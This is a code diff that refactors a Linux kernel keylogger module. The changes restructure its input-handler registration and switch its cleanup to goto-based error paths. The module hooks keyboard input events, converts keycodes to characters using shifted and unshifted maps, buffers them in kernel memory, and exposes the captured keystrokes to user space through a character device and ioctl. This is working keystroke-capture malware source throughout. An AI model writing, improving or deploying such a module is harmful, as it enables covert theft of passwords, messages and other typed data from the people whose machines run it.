@@ -21,29 +21,12 @@ static int buffer_index_to_write = 0;
 
 static DEFINE_MUTEX(buffer_mutex);
 
-static struct input_handler *event_handler;
-static struct class *keylogger_class = NULL;
-static struct device *keylogger_device = NULL;
-
 char map[MAP_SIZE] = "..1234567890-=..qwertyuiop[]..asdfghjkl;'`.\\zxcvbnm,./";
 char shift_map[MAP_SIZE] =
 	"..!@#$%^&*()_+..QWERTYUIOP{}..ASDFGHJKL:\"~.|ZXCVBNM<>?";
 
-static const struct file_operations fops = {
-	.owner = THIS_MODULE,
-	.unlocked_ioctl = keylogger_ioctl,
-};
-
-static const struct input_device_id keylogger_id_table[] = {
-	{ .driver_info = 1,
-	  .flags = INPUT_DEVICE_ID_MATCH_VENDOR | INPUT_DEVICE_ID_MATCH_PRODUCT,
-	  .vendor = 0x1,
-	  .product = 0x1 },
-	{},
-};
-
 // ----------------- Buffer Management -----------------
-static int allocate_buffer(int size)
+int allocate_buffer(int size)
 {
 	if (size <= 0 || size > MAX_BUFFER_SIZE) {
 		return -EINVAL;
@@ -61,7 +44,7 @@ static int allocate_buffer(int size)
 	return 0;
 }
 
-static void free_buffer(void)
+void free_buffer(void)
 {
 	if (buffer) {
 		kfree(buffer);
@@ -73,8 +56,7 @@ static void free_buffer(void)
 }
 
 // ----------------- IOCTL Handling -----------------
-static long keylogger_ioctl(struct file *file, unsigned int cmd,
-			    unsigned long arg)
+long keylogger_ioctl(struct file *file, unsigned int cmd, unsigned long arg)
 {
 	switch (cmd) {
 	case IOCTL_GET_BUFFER_SIZE:
@@ -124,9 +106,8 @@ static long keylogger_ioctl(struct file *file, unsigned int cmd,
 }
 
 // ----------------- Input Handler -----------------
-static int keylogger_connect(struct input_handler *handler,
-			     struct input_dev *dev,
-			     const struct input_device_id *id)
+int keylogger_connect(struct input_handler *handler, struct input_dev *dev,
+		      const struct input_device_id *id)
 {
 	struct input_handle *handle;
 	int error;
@@ -140,23 +121,24 @@ static int keylogger_connect(struct input_handler *handler,
 	handle->name = "keylogger_handle";
 
 	error = input_register_handle(handle);
-	if (error) {
-		kfree(handle);
-		return error;
-	}
+	if (error)
+		goto err_free_handle;
 
 	error = input_open_device(handle);
-	if (error) {
-		input_unregister_handle(handle);
-		kfree(handle);
-		return error;
-	}
+	if (error)
+		goto err_unregister_handle;
 
 	DEBUG_MSG("[INFO] successfully connected to device: %s\n", dev->name);
 	return 0;
+
+err_unregister_handle:
+	input_unregister_handle(handle);
+err_free_handle:
+	kfree(handle);
+	return error;
 }
 
-static void keylogger_disconnect(struct input_handle *handle)
+void keylogger_disconnect(struct input_handle *handle)
 {
 	DEBUG_MSG("[INFO] device disconnected: %s\n", handle->dev->name);
 	input_close_device(handle);
@@ -164,9 +146,8 @@ static void keylogger_disconnect(struct input_handle *handle)
 	kfree(handle);
 }
 
-static void keylogger_event_handler(struct input_handle *handle,
-				    unsigned int type, unsigned int code,
-				    int value)
+void keylogger_event_handler(struct input_handle *handle, unsigned int type,
+			     unsigned int code, int value)
 {
 	if (type != EV_KEY || code >= MAP_SIZE || map[code] == 0 ||
 	    shift_map[code] == 0) {
@@ -193,6 +174,31 @@ static void keylogger_event_handler(struct input_handle *handle,
 	}
 }
 
+// ----------------- Struct Declarations ---------------
+static struct class *keylogger_class = NULL;
+static struct device *keylogger_device = NULL;
+
+static const struct file_operations fops = {
+	.owner = THIS_MODULE,
+	.unlocked_ioctl = keylogger_ioctl,
+};
+
+static const struct input_device_id keylogger_id_table[] = {
+	{ .driver_info = 1,
+	  .flags = INPUT_DEVICE_ID_MATCH_VENDOR | INPUT_DEVICE_ID_MATCH_PRODUCT,
+	  .vendor = 0x1,
+	  .product = 0x1 },
+	{}
+};
+
+static struct input_handler my_input_handler = {
+	.name = "keylogger",
+	.event = keylogger_event_handler,
+	.connect = keylogger_connect,
+	.disconnect = keylogger_disconnect,
+	.id_table = keylogger_id_table,
+};
+
 // ----------------- Module Init/Exit -----------------
 static int __init keylogger_init(void)
 {
@@ -202,82 +208,63 @@ static int __init keylogger_init(void)
 
 	major_device_number = register_chrdev(0, DEVICE_NAME, &fops);
 	if (major_device_number < 0) {
-		return major_device_number;
+		error = major_device_number;
+		goto error;
 	}
 
 	keylogger_class = class_create(THIS_MODULE, DEVICE_NAME);
 	if (IS_ERR(keylogger_class)) {
-		unregister_chrdev(major_device_number, DEVICE_NAME);
-		return PTR_ERR(keylogger_class);
+		error = PTR_ERR(keylogger_class);
+		goto unregister_chrdev;
 	}
 
 	keylogger_device = device_create(keylogger_class, NULL,
 					 MKDEV(major_device_number, 0), NULL,
 					 DEVICE_NAME);
 	if (IS_ERR(keylogger_device)) {
-		class_destroy(keylogger_class);
-		unregister_chrdev(major_device_number, DEVICE_NAME);
-		return PTR_ERR(keylogger_device);
+		error = PTR_ERR(keylogger_device);
+		goto destroy_class;
 	}
 
 	error = allocate_buffer(buffer_size);
 	if (error) {
-		device_destroy(keylogger_class, MKDEV(major_device_number, 0));
-		class_destroy(keylogger_class);
-		unregister_chrdev(major_device_number, DEVICE_NAME);
-		return error;
+		goto destroy_device;
 	}
 
-	event_handler = kzalloc(sizeof(struct input_handler), GFP_KERNEL);
-	if (!event_handler) {
-		free_buffer();
-		device_destroy(keylogger_class, MKDEV(major_device_number, 0));
-		class_destroy(keylogger_class);
-		unregister_chrdev(major_device_number, DEVICE_NAME);
-		return -ENOMEM;
-	}
-
-	event_handler->name = "keylogger";
-	event_handler->event = keylogger_event_handler;
-	event_handler->connect = keylogger_connect;
-	event_handler->disconnect = keylogger_disconnect;
-	event_handler->id_table = keylogger_id_table;
-
-	error = input_register_handler(event_handler);
+	error = input_register_handler(&my_input_handler);
 	if (error) {
-		kfree(event_handler);
-		free_buffer();
-		device_destroy(keylogger_class, MKDEV(major_device_number, 0));
-		class_destroy(keylogger_class);
-		unregister_chrdev(major_device_number, DEVICE_NAME);
-		return error;
+		goto free_buffer;
 	}
 
 	DEBUG_MSG("[INFO] keylogger module initialized successfully\n");
 	return 0;
+
+free_buffer:
+	free_buffer();
+destroy_device:
+	device_destroy(keylogger_class, MKDEV(major_device_number, 0));
+destroy_class:
+	class_destroy(keylogger_class);
+unregister_chrdev:
+	unregister_chrdev(major_device_number, DEVICE_NAME);
+error:
+	return error;
 }
 
 static void __exit keylogger_exit(void)
 {
 	DEBUG_MSG("[INFO] exiting keylogger module...\n");
 
-	if (event_handler) {
-		input_unregister_handler(event_handler);
-		kfree(event_handler);
-		event_handler = NULL;
-	}
-
+	input_unregister_handler(&my_input_handler);
 	free_buffer();
 
 	if (keylogger_device) {
 		device_destroy(keylogger_class, MKDEV(major_device_number, 0));
-		keylogger_device = NULL;
 	}
 
 	if (keylogger_class) {
 		class_unregister(keylogger_class);
 		class_destroy(keylogger_class);
-		keylogger_class = NULL;
 	}
 
 	unregister_chrdev(major_device_number, DEVICE_NAME);
